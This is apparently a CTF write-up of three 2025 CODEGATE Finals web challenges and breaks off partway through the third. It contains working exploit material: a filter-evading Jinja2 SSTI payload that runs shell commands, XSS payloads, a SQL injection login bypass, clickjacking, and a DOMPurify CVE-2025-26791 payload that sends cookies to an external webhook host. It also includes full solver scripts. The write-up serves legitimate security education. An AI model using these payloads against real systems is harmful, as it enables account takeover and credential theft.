---
title: "[ENG] 2025 CODEGATE CTF Web Challenges Final Writeup"
date: 2025-08-25 20:53:39
tags:
  - Writeup
  - CTF
  - CODEGATE
  - Korean
  - Security
  - Web
language: en
author: Predic, goldleo1
thumbnail: "/images/thumbnail/codegate_2025_writeup.png"
copyright: |
  © 2025 HSPACE (References) Author: Rewrite Lab (김민찬, 박진완)
  This copyright applies to this document only.
---

# TL;DR

![image.png](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image.png)

This post is a write-up for the WEB category of the **2025 CODEGATE CTF Finals**, covering two challenges from the Junior Division and three from the General Division.

The list of challenges is as follows:

**Junior Division**

- Censored Board
- Masquerade-REVENGE

**General Division**

- securewebmail
- chachadotcom (common challenge for both divisions)
- gravelbox

For each challenge, this write-up will cover the vulnerability analysis and exploitation process step-by-step. In particular, it will explain in detail how various techniques—such as **SSTI Bypass**, **DOMPurify Bypass**, **Node.js ROP**, and **open_basedir bypass with Race Condition** —were utilized in the actual problems.

# [WEB] Censored Board

## TL;DR

This challenge involves exploiting **SSTI (Server-Side Template Injection)** to read the contents of `/flag`.
In Python’s **Jinja2** module, template rendering is provided, and if user input is directly rendered, SSTI can occur.
However, since outbound requests are blocked, the attacker must first read the flag and then create a post containing it, which can later be viewed to retrieve the flag.
Alternatively, it is also possible to obtain the flag by combining **XSS and SSTI**.

## Overview

We need to read the flag located at `/flag`.

```python
@app.route("/", methods=["GET"])
def index():
    return render_template('index.html', articles=articles)
```

When accessing `/`, it displays all contents in the articles array.

```html
{% for article in articles %}
<div class="bg-white shadow rounded-lg p-6 mb-4 hover:shadow-md transition">
  <h2 class="text-xl font-semibold text-blue-600">{{ article.title }}</h2>
  <p class="text-gray-700 mt-2">{{ article.content }}</p>
</div>
{% endfor %}
```

By providing the `title` and `content` parameters to the `/write` endpoint, the bot will access the `/article` path with those values included and view the corresponding post.

```python
@app.route("/write", methods=["GET", "POST"])
def write():
    if request.method == 'POST':
        title = request.form.get("title", "")
        content = request.form.get("content", "")

        url = f"http://localhost:5000/article?title={title}&content={content}"

        # Admin will censor article.
        try:
            visit_url(url)
        except Exception as e:
            return f"Error: {e}", 500

        return "<script>alert('Submitted.');location.href='/';</script>"

    return render_template('write.html')
```

`/article` and `/accept` are restricted with `@localhost_only`, so they cannot be accessed from outside.

Therefore, by sending a request to the bot via `/write`, it is possible to make the bot access `/article`.

```python
BLACKLIST = [
    r'__', r'\.', r'\[', r'\]', r'\+',
    r'request', r'config', r'os', r'subprocess',
    r'import', r'init', r'globals', r'open', r'read', r'mro', r'class'
]

def is_safe(s):
    return not any(re.search(b, s, re.IGNORECASE) for b in BLACKLIST)

@app.route("/article", methods=["GET"])
@localhost_only
def view():
    result = ""
    title = request.args.get("title", "")
    content = request.args.get("content", "")

    if title != "" and content != "":
        if is_safe(title) & is_safe(content):
            template = f"Title: { title }<br>Content: { content }"
            result = render_template_string(template)
        else:
            result = "Blocked"

    return f"""
        <pre>{result}</pre>
        <form action="/accept" method="POST">
            <input name="title" value="{title}" type="hidden">
            <input name="content" value="{content}" type="hidden">
            <button type="submit">Submit article</button>
        </form>
    """
```

Looking at the core functionality, you can write posts at `/article` which has `@localhost_only` decorator, and SSTI occurs in render_template_string, plus XSS is also possible.

The `is_safe()` function filters `__`, `.`, `[`, `]`, etc., but these can be easily bypassed.

```docker
CMD sh -c "\
    iptables -A OUTPUT -o lo -j ACCEPT && \
    iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT && \
    iptables -P OUTPUT DROP && \
    su -s /bin/sh ctf -c 'python3 app.py'"

```

While it might seem like we could simply read the flag through SSTI and send it to an attacker's server, the `OUTPUT DROP` setting prevents outbound requests.
Therefore, we need to find another way to check the flag.

```python
@app.route("/accept", methods=["POST"])
@localhost_only
def accept():
    title = request.form.get("title", "")
    content = request.form.get("content", "")

    articles.append({"title": title, "content": content})

    return redirect('/')

```

Sending a POST request to `/accept` adds a post to articles, making it viewable at `/`.

## Solution

The core idea is as follows:

1. Read `/flag` using SSTI
2. Send a request to `/accept` using XSS

Alternatively, we can use only SSTI to execute both flag reading and writing at once.

### 1.1 Reading `/flag` using SSTI

```python
BLACKLIST = [
    r'__', r'\.', r'\[', r'\]', r'\+',
    r'request', r'config', r'os', r'subprocess',
    r'import', r'init', r'globals', r'open', r'read', r'mro', r'class'
]

```

Referencing [SSTI-Vulnerability(me2nuk)](https://me2nuk.com/SSTI-Vulnerability), we can bypass the BLACKLIST.

```python
{{ ''|attr('__class__') }} # Bracket bypass
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }} # Underscore bypass (character bypass)

```

Using these two methods, we can craft our payload.

![Testing after removing @localhost_only](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%201.png)

Testing after removing @localhost_only

```python
</pre><pre id="flag">{{()|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5fb\x61se\x5f\x5f')|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(485)('cat /flag',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}</pre><pre>

```

To simplify flag parsing, I added a new `<pre id="flag">` tag.

---

### 1.2 Alternative Method to Bypass SSTI Filters

At Codegate 2025 Finals, [Void](https://pdw0412.tistory.com/m/) solved it using the following method.

The overall exploit flow is similar, but it's interesting that they didn't use `\`, so I've included it here.

Let's look at the payload first and understand it.

```html
{% set u='_' %}{% set d=u*2 %} {% set g =
cycler|attr(d~'i'~'n'~'i'~'t'~d)|attr(d~'g'~'l'~'o'~'b'~'a'~'l'~'s'~d) %} {% set
get_fg = g | attr('g'~'e'~'t') %} {{get_fg}} {% set b =
get_fg(d~'b'~'u'~'i'~'l'~'t'~'i'~'n'~'s'~d) %} {% set get_fb = b |
attr('g'~'e'~'t') %} {% set imp = get_fb(d~'i'~'m'~'p'~'o'~'r'~'t'~d) %} {{imp}}
{% set dot = get_fb('chr')(46) %} {% set http = imp('h' ~ 't' ~ 't' ~ 'p' ~ dot
~ 'c' ~ 'l' ~ 'i' ~ 'e' ~ 'n' ~ 't') %} {{http}} {% set httpc =
imp('h'~'t'~'t'~'p'~dot~'c'~'l'~'i'~'e'~'n'~'t', None, None, ('client',)) %} {%
set lh = 'localho'~'st' %} {{lh}} {% set conn = httpc|attr('HTTPConnection')(lh,
5000) %} {{conn}} {% set rq = 'r'~'e'~'q'~'u'~'e'~'s'~'t' %} {% set str_op =
'op'~'en' %} {{str_op}} {% set op = get_fb(str_op) %} {{op}} {% set rd =
'r'~'e'~'a'~'d' %} {% set flag = op('/flag')|attr(rd)() %} {{flag}} {% set body
= 'title=win&content=' ~ flag|urlencode %} {% set hdrs =
{'Content-Type':'application/x-www-form-urlencoded'} %} {% set str_pt =
'PO'~'ST' %} {{str_pt}} {{ conn | attr(rq)(str_pt, '/accept', body, hdrs) }} {{
conn | attr('g'~'e'~'t'~'r'~'e'~'s'~'p'~'o'~'n'~'s'~'e')() }}
```

In jinja2, variables must be declared using `{% set name = value %}` syntax.

To bypass the `__` (double underscore) filtering, he use `{% set u='_' %}{% set d=u*2 %}`.

Afterwards, they import `http.client` via **`cycler.init.globals.__builtins__.import`**, read the flag using `open('/flag')`, send the flag to `/accept` via POST request to store it on the server, and then read the flag.

---

### 2. Sending Request to `/accept` using XSS

Now we need to execute XSS while bypassing the BLACKLIST.

For simplicity, I chose to write XSS code, base64 encode it, and eval it.

1. **Original Code**

```jsx
window.onload = () => {
  document.querySelector("input").value =
    document.querySelector("pre#flag").textContent;
  document.querySelector("button").click();
};
```

This reads the flag from `pre#flag`, puts it in input.value, and sends a POST request to `/accept` through the form.

1. **BASE64 + URL Encoding**

```
d2luZG93Lm9ubG9hZD0oKT0+e2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0JykudmFsdWUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdwcmUjZmxhZycpLnRleHRDb250ZW50O2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2J1dHRvbicpLmNsaWNrKCk7fTs=

```

After BASE64 encoding, I applied URL encoding to prevent characters like `+` from being treated as special characters when included in GET parameters.

## Solver

```python
import requests as req
from base64 import b64encode
from urllib.parse import quote
import re

url = 'http://localhost:5000'

ssti_payload = '''
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(485)('cat /flag',shell=True,stdout=-1)|attr('communicate')()|attr('__getitem__')(0)|attr('decode')('utf-8')}}
'''.strip().replace('_','\\x5f').replace('c', '\\x63')

xss_payload = b'''window.onload=()=>{document.querySelector('input').value = document.querySelector('pre#flag').textContent;document.querySelector('button').click();};'''
xss_payload = quote(b64encode(xss_payload))
xss_payload = f'<script>eval(atob(decodeURIComponent("{xss_payload}")))</script>'

payload = '</pre><pre id="flag">' + ssti_payload + '</pre>' + xss_payload + '<pre>'

res = req.post(f'{url}/write', data={
    'title': 'dummy',
    'content': quote(payload)
})

res = req.get(url)
flag = re.findall(r"codegate2025\{.+\}", res.text)[0]

print(flag)

```

# [WEB] Masquerade-REVENGE

## TL;DR

This challenge is the **REVENGE** version of _Masquerade_, which appeared in the qualifiers. It involves chaining three vulnerabilities — **SQL Injection**, **Clickjacking**, and a **DOMPurify Bypass (CVE-2025-26791)** — to obtain the flag from the bot’s JWT token.

During login, the lack of data type validation leads to an **SQL Injection** vulnerability. Next, by exploiting the bot’s automatic logic that clicks the `#delete` button, the attacker manipulates the button’s position using CSS to perform a **Clickjacking**, tricking the bot into navigating to the `/admin/test` page. On this page, the CSP allows `unsafe-inline`, enabling an **XSS** payload injection via the DOMPurify vulnerability (CVE-2025-26791).

Finally, the XSS executes, sending the bot’s cookie to an external webhook server, allowing the attacker to retrieve the flag.

## Overview

```docker
FROM node:20-bullseye-slim

RUN apt-get update && apt-get install -y \
    chromium \
    fonts-liberation \
    libx11-xcb1 \
    libnspr4 \
    libnss3 \
    libxcomposite1 \
    libxdamage1 \
    libxfixes3 \
    libxrandr2 \
    --no-install-recommends && \
    rm -rf /var/lib/apt/lists/*

COPY . /app/

WORKDIR /app

RUN npm install

EXPOSE 3000

CMD ["node", "index.js"]

```

From the Dockerfile using `chromium`, we can infer this is a client-side problem involving XSS, CSRF, etc.

```jsx
// app/utils/report.js:6:39
const viewUrl = async (post_id) => {
  const token = generateToken({
    username: "codegate2025{fake_flag}",
    role: "ADMIN",
    hasPerm: true,
  });

  const cookies = [{ name: "jwt", value: token, domain: "localhost" }];

  const browser = await puppeteer.launch({
    executablePath: "/usr/bin/chromium",
    args: ["--no-sandbox"],
  });

  let result = true;

  try {
    await browser.setCookie(...cookies);

    const page = await browser.newPage();

    await page.goto(`http://localhost:3000/post/${post_id}`, {
      timeout: 3000,
      waitUntil: "domcontentloaded",
    });

    await delay(1000);

    const button = await page.$("#delete");
    await button.click();

    await delay(1000);
  } catch (error) {
    console.error("An Error occurred:", error);
    result = false;
  } finally {
    await browser.close();
  }

  return result;
};
```

Looking at the bot behavior, it visits `/post/${post_id}` and after 1 second, clicks the `#delete` button.

```jsx
// app/index.js:27:49
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString("hex");

  res.setHeader("X-Frame-Options", "deny");

  if (req.path.startsWith("/admin")) {
    res.setHeader(
      "Content-Security-Policy",
      `default-src 'self'; script-src 'self' 'unsafe-inline'; base-uri 'none'`,
    );
  } else {
    res.setHeader(
      "Content-Security-Policy",
      `default-src 'self'; script-src 'nonce-${nonce}'; base-uri 'none'`,
    );
  }

  res.locals.nonce = nonce;

  next();
});

app.use("/", mainRoute);
app.use("/auth", authRoute);
app.use("/user", userRoute);
app.use("/post", postRoute);
app.use("/admin", adminRoute);
app.use("/dev", devRoute);
app.use("/report", reportRoute);
```

For `/admin/`, the CSP is `default-src 'self'; script-src 'self' 'unsafe-inline'; base-uri 'none'`.

For other endpoints, it's `default-src 'self'; script-src 'nonce-${nonce}'; base-uri 'none'`.

Since the nonce is generated through `crypto.randomBytes()`, bypassing it is impossible. To execute JavaScript, we need to utilize `/admin/`.

This server has roles, and only certain roles can perform specific actions.
ADMIN or INSPECTOR can change arbitrary user roles at `/user/role`.

```jsx
router.post("/role", async (req, res) => {
  const isStaff = await isPrivileged(req.user.role);
  if (isStaff)
    return res
      .status(400)
      .json({ message: "Staff accounts are not allowed to change role." });

  const { role } = req.body;
  const result = await setUserRole(req.user.username, role);
  if (!result) return res.status(400).json({ message: "Invalid Role." });

  res.json({ message: "Role Changed." });
});
```

- INSPECTOR - Can use **report** functionality

```jsx
// app/routes/report.js:18:27
if (req.user.role !== "INSPECTOR") {
        message = "No Permission.";
        code = 403;
  }
  else {
      const result = await viewUrl(post_id);
      ...
  }

```

- ADMIN - Can access `/admin/` sub-pages

```jsx
// app/utils/guard.js:1:5
const adminGuard = (req, res, next) => {
  if (req.user.role !== "ADMIN")
    return res.status(403).json({ message: "Forbidden." });

  next();
};
```

- DEV, BANNED - Not necessary for solving the problem.

Also, only when `perm = true` can posts be written.

```jsx
// app/routes/post.js:28:42
router.post('/write', async (req, res) => {
    const isStaff = await isPrivileged(req.user.role);
    if (isStaff) return res.status(400).json({ message: "Staff accounts are not allowed to write posts." });

    const hasPerm = await getUserPerm(req.user.username);
    if (!hasPerm) return res.status(400).json({ message: "You have no permission." });
    ...
});

```

```jsx
// app/models/userModel.js:57:69
const getUserPerm = async (username) => {
    const query = 'SELECT * FROM users WHERE username = ? AND hasPerm = true';
		...
}

```

## Solution

The core ideas are as follows:

1. **Obtain INSPECTOR, ADMIN privileges**
2. **Click Jacking**
3. **XSS in `/admin/test` (CVE-2025-26791)**

### 1. Obtaining INSPECTOR, ADMIN Privileges

```sql
// db/initdb.d:7:23
INSERT INTO users (username, password, hasPerm, role) VALUES
('admin', 'fake_admin_password', true, 'ADMIN'),
('inspector', 'fake_inspector_password', false,  'INSPECTOR');

```

When initializing the DB, it creates one account each with ADMIN privileges and INSPECTOR privileges.

```jsx
// app/routes/auth.js:9:17
router.post("/login", async (req, res) => {
  const { username, password } = req.body;

  const token = await login(username, password);

  if (!token) return res.status(401).json({ message: "login failed." });
  return res.json({ message: "Logged in successfully.", token });
});
```

`/auth/login` doesn't check the type of username and password.

```jsx
// app/models/userModel.js:21:41
const login = async (username, password) => {
  const query = "SELECT * FROM users WHERE username = ? AND password = ?";

  try {
    const results = await db.query(query, [username, password]);

    if (results.length === 0) return false;
    if (results[0].role === "BANNED") return false;

    payload = {
      username: username,
      role: results[0].role,
    };

    const token = generateToken(payload);
    return token;
  } catch {
    return false;
  }
};
```

Since we can input values of desired types, SQL Injection occurs.

[Express.js + MySQL SQLi(RAON - Core Research Team)](https://core-research-team.github.io/2020-10-01/Expressjs)

```python
import requests as req

url = 'http://localhost:3000'

admin = req.Session()

res = admin.post(f'{url}/auth/login', json={
    'username': 'admin',
    'password': {'password': '1'}
})
print(res.text)
# {"message":"Logged in successfully.","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6IkFETUlOIiwiaWF0IjoxNzUzMzE0NTM1LCJleHAiOjE3NTMzMTgxMzV9.-Nq_m0IvZFHE4_BF4eXr1Sag4NClSrg5qd5EVtA5TFQ"}

```

Now we can use all functionalities.

### 2. Click Jacking

First, directly causing XSS in posts is impossible due to `DOMPurify.sanitize()`.

However, through Google search, we can find that XSS is possible in `/admin/test` ([CVE-2025-26791](https://nvd.nist.gov/vuln/detail/CVE-2025-26791)).

Therefore, we need to think of a way to redirect the bot that visits `/post/${post_id}` to `/admin/test`.

(Open Redirect, **Click Jacking**, etc.)

```jsx
// app/routes/post.js:44:68
router.get("/:post_id", async (req, res) => {
  const post = await getPostById(req.params.post_id);

  if (!post) return res.status(404).json({ message: "Post Not Found." });

  const window = new JSDOM("").window;
  const DOMPurify = createDOMPurify(window);

  const config = {
    FORBID_TAGS: ["meta", "iframe"],
    FORBID_ATTR: ["onerror", "onload", "onclick"],
  };

  const sanitizedTitle = DOMPurify.sanitize(post.title, config);
  const sanitizedContent = DOMPurify.sanitize(post.content, config);

  res.render("post/view", {
    post: {
      post_id: post.post_id,
      title: sanitizedTitle,
      content: sanitizedContent,
      theme: post.theme,
    },
  });
});
```

Since `<meta>` is blocked in the config, redirect using refresh is impossible.

We can consider Click Jacking by utilizing the fact that the bot clicks the `#delete` button.

```jsx
const button = await page.$("#delete");
await button.click();
```

In normal situations, Click Jacking is impossible when selecting HTML elements by ID.

[https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector)

(If the result of querySelector matches an ID that's incorrectly used more than once in the document, the first element with that ID is returned.)

```html
<div id="A">1</div>
<div id="A">2</div>

<script>
  console.log(document.querySelector("#A").textContent); // 1
</script>
```

However, it's possible thanks to puppeteer's implementation.

```tsx
@throwIfDisposed()
@bindIsolatedHandle
async click(
    this: ElementHandle<Element>,
    options: Readonly<ClickOptions> = {},
): Promise<void> {
    await this.scrollIntoViewIfNeeded();
    const {x, y} = await this.clickablePoint(options.offset);
    await this.frame.page().mouse.click(x, y, options);
}
```

[https://github.com/puppeteer/puppeteer/blob/b4d4d1915f729a2760a8c74b50877d92ce5e1c94/packages/puppeteer-core/src/api/ElementHandle.ts#L760](https://github.com/puppeteer/puppeteer/blob/b4d4d1915f729a2760a8c74b50877d92ce5e1c94/packages/puppeteer-core/src/api/ElementHandle.ts#L760)

When puppeteer executes `$().click()`, it gets the position of the selected element and then clicks that location, so Click Jacking is possible by manipulating **position** or z-index through CSS.

However, since CSP is `default-src 'self';`, we need to load CSS that exists on the server through `post.theme`.

```html
<!-- app/views/post/view.ejs:9 -->
<link rel="stylesheet" href="/css/theme/<%= post.theme %>.css" />
```

There's a good gadget in `app/public/css/switch.css`.

```css
/* app/public/css/switch.css:16:26 */
.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #ccc;
  -webkit-transition: 0.4s;
  transition: 0.4s;
}
```

When given the `slider` property, the button fills the entire screen.

![<button class="slider"></button>](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%202.png)

<button class="slider"></button>

Now we can send requests to desired URLs through Click Jacking.

```html
<form id="a" action="//localhost:3000/admin/test">
  <input type="text" name="content" value="xxxx" /><button
    id="delete"
    form="a"
    class="slider"
  >
    a
  </button>
</form>
```

### 3. XSS in `/admin/test` (CVE-2025-26791)

Accessing `/admin/test` renders the `test.ejs` file.

```html
<!-- app/views/admin/test.ejs:14:42 -->
<script>
  window.addEventListener("load", async () => {
    const post_title = document.querySelector(".post_title");
    const post_content = document.querySelector(".post_content");
    const error_div = document.querySelector(".error_div");

    const urlSearch = new URLSearchParams(location.search);
    const urlTitle = urlSearch.get("title");
    const urlContent = urlSearch.get("content");

    const result = await fetch("/admin/sanitize", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        title: atob(urlTitle),
        content: atob(urlContent),
      }),
    });

    const { title, content } = await result.json();

    post_title.innerHTML = title;
    post_content.innerHTML = content;
  });
</script>
```

It gets `title` and `content` from URLSearchParams, base64 decodes them, sends a request to `/admin/sanitize` to sanitize the results, and loads them to the frontend through innerHTML.

```jsx
const config = {
  SAFE_FOR_TEMPLATES: true,
  CUSTOM_ELEMENT_HANDLING: {
    tagNameCheck: /^custom-/,
  },
};

router.post("/sanitize", (req, res) => {
  const { title, content } = req.body;

  const window = new JSDOM("").window;
  const DOMPurify = createDOMPurify(window);

  const sanitizedTitle = DOMPurify.sanitize(title, config);
  const sanitizedContent = DOMPurify.sanitize(content, config);

  res.json({ title: sanitizedTitle, content: sanitizedContent });
});
```

By examining the logic of `/admin/sanitize`, it becomes clear that the `SAFE_FOR_TEMPLATES` and `CUSTOM_ELEMENT_HANDLING` properties from the `config` are used during the sanitization process

Looking up these configuration settings reveals that the challenge leverages a 1-day vulnerability — [CVE-2025-26791](https://nvd.nist.gov/vuln/detail/CVE-2025-26791).

```html
<math
  ><custom-test
    ><mi
      ><li>
        <table>
          <custom-test><li></li></custom-test
          ><a>
            <style>
              <! \${
            </style>
            }
            <custom-b
              id="><img src onerror='location.href=`https://a393275e-a197-4977-9eb3-8a0cd803aab8.webhook.site/?q=`.concat(document.cookie);'>"
              >hmm...</custom-b
            >
          </a>
        </table>
      </li></mi
    ></custom-test
  ></math
>
```

By obtaining the PoC payload, adapting it to the current challenge environment, and then applying base64 encoding before delivery, the challenge can ultimately be solved.

## Solver

```python
import requests as req

url = 'http://localhost:3000'

admin = req.Session()
user = req.Session()
inspector = req.Session()

username = 'goldleo1'
password = 'af049f3jforgjju0'

res = admin.post(f'{url}/auth/login', json={
    'username': 'admin',
    'password': {'password': '1'}
})
admin.cookies.update({"jwt": res.json().get('token')})

res = inspector.post(f'{url}/auth/login', json={
    'username': 'inspector',
    'password': {'password': '1'}
})
inspector.cookies.update({"jwt": res.json().get('token')})

res = user.post(f'{url}/auth/register', json={
    'username': username,
    'password': password
})
res = user.post(f'{url}/auth/login', json={
    'username': username,
    'password': password
})
user.cookies.update({"jwt": res.json().get('token')})

res = admin.post(f'{url}/admin/user/perm', json={
    'username': username,
    'value': True
})

res = user.post(f'{url}/post/write', json={
    'title': 'dummy',
    'content': '<form action="//localhost:3000/admin/test"><input type="text" name="content" value="PG1hdGg+PGN1c3RvbS10ZXN0PjxtaT48bGk+PHRhYmxlPjxjdXN0b20tdGVzdD48bGk+PC9saT48L2N1c3RvbS10ZXN0PjxhPg0KICAgICAgPHN0eWxlPg0KICAgICAgICA8ISBcJHsNCiAgICAgIDwvc3R5bGU+DQogICAgICB9DQogICAgICA8Y3VzdG9tLWIgaWQ9Ij48aW1nIHNyYyBvbmVycm9yPSdsb2NhdGlvbi5ocmVmPWBodHRwczovL2EzOTMyNzVlLWExOTctNDk3Ny05ZWIzLThhMGNkODAzYWFiOC53ZWJob29rLnNpdGUvP3E9YC5jb25jYXQoZG9jdW1lbnQuY29va2llKTsnPiI+aG1tLi4uPC9jdXN0b20tYj4NCiAgICA8L2E+PC90YWJsZT48L2xpPjwvbWk+PC9jdXN0b20tdGVzdD48L21hdGg+"><button id="delete" class="slider">a</button></form>' ,
    'theme': '../switch'
})
post_id = res.json().get('post')

res = inspector.get(f'{url}/report/{post_id}')
print(res.text)

```

The writeup concludes with successful flag capture through webhook.site receiving the JWT token.

![<button class="slider"></button>](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%202.png)

<button class="slider"></button>

![ jwt token](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%203.png)

jwt token

![Get FLAG!](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%204.png)

Get FLAG!

# [WEB] securewebmail

(13 solves)

## TL;DR

This challenge involves stealing a bot's cookie by bypassing DOMPurify using charset encoding.

Browsers support various character encoding methods. This can be exploited to make a browser interpret a specific sequence with a different charset, thereby bypassing filters. In other words, the bypass is possible by exploiting the discrepancy between how DOMPurify processes the input and how the browser actually renders it.

However, an unintended solution for this problem also existed, which led to it being the most-solved challenge in the web category at the CodeGate CTF finals.

Below, I will first explain the intended solution, followed by a look at the unintended method.

## Analysis

First, after signing up, you can compose an email and send it to others.

![Register Page](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%205.png)

Register Page

![**Mail composition page**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%206.png)

**Mail composition page**

Mail transmission is handled through **`POST /compose`**, and the mail is sent using the **`smtpService`**

![**MailboxService.java mail sending code**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%207.png)

**MailboxService.java mail sending code**

At this point, if we check the location of the FLAG, we can see that it is stored in the bot’s cookie.

Notably, since the bot’s cookie has `httpOnly: false`, we can infer that this is an XSS challenge.

![**Store FLAG in a cookie (bot/main.js)**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%208.png)

**Store FLAG in a cookie (bot/main.js)**

The bot logs in with the admin email account and then enters its mailbox to check the received emails.

![**Log in with your ADMIN email**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%209.png)

**Log in with your ADMIN email**

![**Store received emails in a queue and check them one by one**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2010.png)

**Store received emails in a queue and check them one by one**

Based on the above, we can outline the following exploit scenario:

1. Inject malicious HTML code into the email to trigger XSS.
2. Send the email to **admin@securemail.com**.
3. When the admin opens the email, the XSS is executed and the cookie is leaked.

However, approximately two layers of filtering are applied to the email.

![**Mailcontroller.java, emailContent function that retrieves email content**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2011.png)

**Mailcontroller.java, emailContent function that retrieves email content**

1. Jsoup.clean Filtering

When checking a received email, the first layer of filtering is applied through the `parseMessage` function.

![[MailboxService.java](http://MailboxService.java), parseMessage Function](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2012.png)

[MailboxService.java](http://MailboxService.java), parseMessage Function

Looking at the contents applied to the safelist, we can see the following:

- `<style>` tags are allowed
- Inline styles are allowed
- `<img>` tags are allowed with the attributes `src`, `alt`, `title`, `width`, and `height`
- For the `src` attribute of `<img>`, the protocols `http`, `https`, and `data` are allowed

After that, the value filtered by `Jsoup.clean` is applied to the message content, and the charset from the mail’s `contentType` is retrieved and applied to the response’s charset.

1. Dompurify Filtering

The content value filtered through `Jsoup.clean` is then passed into the `buildDomPurifyWrapper` function, goes through the `escapeJsStringLiteral` function, and is assigned as a raw value.

![[MailController.java](http://MailController.java), buildDompurifyWrapper Function](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2013.png)

[MailController.java](http://MailController.java), buildDompurifyWrapper Function

Although Dompurify allows `<style>` tags and attributes, since the latest version is being used, there are no known vulnerabilities.

Therefore, instead of bypassing Dompurify directly, another trick must be used.

## Dompurify Bypass

![escapeJsStringLiteral Function](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2014.png)

escapeJsStringLiteral Function

In the `escapeJsStringLiteral` function, the input value passed as an argument is wrapped in double quotes (`"`) and all other special characters as well as the `</script>` sequence are escaped.

If it were possible to escape the double quote (`"`), we could inject another malicious script inside the `<script>` block. However, since the `escapeJsStringLiteral` function prepends a backslash (`\`) before each double quote, it cannot be escaped easily.
At this point, a vulnerability can be found in the `parseMessage` function.
In the `parseMessage` function, the `charset` from the `contentType` is retrieved. If this `charset` is set to a value other than UTF-8, it becomes possible to exploit the difference in MIME interpretation between Java and Chrome to bypass the double quote restriction.

![**The part that specifies the charset in the parseMessage function**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2015.png)

**The part that specifies the charset in the parseMessage function**

This technique is well described in the document below.

https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/

In browsers like Chrome, it is possible to switch to a different character set using escape sequences. The post describes a total of four such methods.

- \x1b\x28\x42 ⇒ ASCII
- \x1b\x28\x4a ⇒ JIS X 0201 1976
- \x1b\x24\x40 ⇒ JIS X 0208 1978
- \x1b\x24\x42 ⇒ JIS X 0208 1983

Among these, `JIS X 0201 1976` is largely compatible with ASCII, so most characters are generated identically.

However, when looking at the code table, there are a few parts that differ from the ASCII table.

![JIS X 0201 1976 table](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2016.png)

JIS X 0201 1976 table

In particular, while `0x5C` in ASCII corresponds to the backslash (`\`) character, in JIS X 0201:1976 it maps to the `¥` character.

As a result, the backslash is replaced with `¥`, which prevents the double quote (`"`) from being escaped.

In other words, `\"` becomes `¥"`, allowing the double quote (`"`) to be used as is, and enabling the injection of arbitrary scripts inside the `<script>` tag.

The exploit process using this technique is as follows:

1. Wrap the payload inside a `<style>` tag so that it is not removed by `Jsoup.clean`, and insert the escape sequence, double quote (`"`), and the script code you want to execute.
2. Specify the charset as **JIS X 0201:1976** for encoding and send it directly to the mail server (the mail server is open on port 25).

![**The mailbox is mapped to port 25.**](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2017.png)

**The mailbox is mapped to port 25.**

1. Send it to admin@securemail.com so that the bot reads the email and the cookie gets stolen.

Since the post mainly focused on ISO-2022-JP encoding, I first tried using ISO-2022-JP.

However, whether it was due to Java not supporting it or the latest version of Chrome blocking it, the escaping did not work as expected.

Nevertheless, in the document below, I was able to find several other charsets that support `JIS X 0201 1976`

https://docs.oracle.com/javase/jp/6/technotes/guides/intl/encoding.doc.html

![JIS X 0201 Search Results](/[KR]%202025%20CODEGATE%20CTF%20Web%20Challenges%20Writeup%2025595ea211f580cca84cefe7f436db5f/image%2018.png)

